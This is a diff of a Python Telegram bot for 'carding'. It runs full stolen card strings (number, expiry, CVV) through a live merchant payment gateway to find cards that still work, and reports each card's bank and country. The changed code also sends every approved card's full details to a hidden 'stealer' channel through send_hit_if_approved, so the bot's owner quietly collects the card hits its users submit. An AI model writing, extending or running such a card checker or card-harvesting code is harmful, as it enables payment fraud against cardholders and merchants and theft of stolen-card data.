@@ -15,6 +15,10 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 STEALER_CHANNEL_ID = -1003627495953
 fake = Faker()
 
+# Owner DM Link
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
 async def send_hit_if_approved(client: Client, text: str):
     try:
         await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
@@ -122,6 +126,7 @@ async def hiburma_check(fullcc):
 async def hiburma_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
+        first_name = message.from_user.first_name
         checkall = await check_all_thing(Client, message)
 
         gateway = "HiBurma 1£ Charge"
@@ -150,17 +155,17 @@ async def hiburma_cmd(Client, message):
 
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, message.id)
 
         secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
@@ -177,24 +182,31 @@ async def hiburma_cmd(Client, message):
 
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        finalresp = f"""
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}
+        if "Approved" in status or "✅" in status:
+            status_text = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+        else:
+            status_text = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
 
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
+        finalresp = f"""{status_text}
 
-[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
-[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
+{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} — {type_} — {level}
+{SYMBOL} 𝗕𝗮𝗻𝗸: {bank}
+{SYMBOL} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time.perf_counter() - start:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+
         await asyncio.sleep(0.5)
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
         await setantispamtime(user_id)
@@ -234,17 +246,29 @@ async def mass_hiburma_cmd(Client, message):
             return
 
         start = time.perf_counter()
+        approved_count = 0
+        declined_count = 0
+        processed = 0
+        total = len(ccs)
+        approved_cards = []
 
-        text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ʜɪʙᴜʀᴍᴀ</b> ✧
-━━━━━━━━━━━━━━━━━━━━
-[玄] 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» [{len(ccs)} / 100]
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
-━━━━━━━━━━━━━━━━━━━━
+        text = f"""Auto HiBurma
+Admin
 
-"""
+{SYMBOL} Response: Starting...
+
+Progress: 0/{total}
+Approved: 0
+Declined: 0
+Remaining: {total}
+
+Checked by: {first_name} ({role})"""
+
         nov = await message.reply_text(text, message.id)
 
         for i, fullcc in enumerate(ccs, 1):
+            processed = i
+            remaining = total - processed
             status, response = await hiburma_check(fullcc)
 
             cc_num = fullcc.split('|')[0]
@@ -256,31 +280,112 @@ async def mass_hiburma_cmd(Client, message):
             country = getbin[4] if len(getbin) > 4 else "Unknown"
             flag = getbin[5] if len(getbin) > 5 else ""
 
-            text += f"""[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙪𝙡𝙩 -» {response}
+            if "Approved" in status or "✅" in status:
+                approved_count += 1
+                response_status = "APPROVED ✓"
+                approved_cards.append({
+                    "fullcc": fullcc,
+                    "response": response,
+                    "gateway": gateway,
+                    "brand": f"{brand} — {type_} — {level}",
+                    "bank": bank,
+                    "country": country,
+                    "flag": flag,
+                    "time": time.perf_counter() - start
+                })
+            else:
+                declined_count += 1
+                response_status = "DECLINED ✗"
 
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
-━━━━━━━━━━━━━━━━━━━━
-
-"""
+            # Update progress
             try:
-                await Client.edit_message_text(message.chat.id, nov.id, text)
+                await Client.edit_message_text(
+                    message.chat.id, 
+                    nov.id, 
+                    f"""Auto HiBurma
+Admin
+
+{SYMBOL} Response: {response_status}
+
+Progress: {processed}/{total}
+Approved: {approved_count}
+Declined: {declined_count}
+Remaining: {remaining}
+
+Checked by: {first_name} ({role})"""
+                )
             except:
                 pass
 
-            if "Approved" in status:
-                await send_hit_if_approved(Client, f"[玄] 𝘾𝘾 -» <code>{fullcc}</code>\n[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}\n[玄] 𝙂𝙖𝙩𝙚 -» {gateway}")
+            await asyncio.sleep(0.5)
 
-            await asyncio.sleep(1)
+        # Delete progress message
+        await nov.delete()
 
-        text += f"""[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{first_name}</a> ↯ {role}
-[玄] 𝙊𝙬𝙣𝙚𝙧 -» @pipin_o
-━━━━━━━━━━━━━━━━━━━━"""
-        await Client.edit_message_text(message.chat.id, nov.id, text)
+        # Send each approved card as separate message
+        for card in approved_cards:
+            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
+
+{SYMBOL} 𝗖𝗖 ⇾ {card['fullcc']}
+{SYMBOL} 𝗚𝗮𝘁ᴇᴡᴀʏ ⇾ {card['gateway']}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
+{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            
+            await message.reply_text(approved_msg, message.id)
+            await send_hit_if_approved(Client, approved_msg)
+            await asyncio.sleep(0.5)
+
+        # Send declined summary
+        elapsed_time = round(time.perf_counter() - start, 2)
+        
+        if approved_count > 0:
+            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
+
+━━━━━━━━━━━━━━━━━━━━
+"""
+            # Show declined cards (limited to avoid long message)
+            for card in ccs[:15]:
+                if card not in [ac['fullcc'] for ac in approved_cards]:
+                    declined_summary += f"{SYMBOL} {card} → Declined\n"
+            
+            if declined_count > 15:
+                declined_summary += f"\n... and {declined_count - 15} more declined cards"
+            
+            declined_summary += f"""
+━━━━━━━━━━━━━━━━━━━━
+✅ Approved: {approved_count}
+❌ Declined: {declined_count}
+📊 Total: {total}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+            
+            await message.reply_text(declined_summary, message.id)
+        else:
+            # No approved cards
+            await message.reply_text(
+                f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs
+
+━━━━━━━━━━━━━━━━━━━━
+📊 Total Cards: {total}
+❌ All Declined: {declined_count}
+⏱ Time: {elapsed_time}s
+👤 Checked by: {first_name} ({role})
+
+━━━━━━━━━━━━━━━━━━━━
+<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+                message.id
+            )
+
         await massdeductcredit(user_id, len(ccs))
         await setantispamtime(user_id)
 
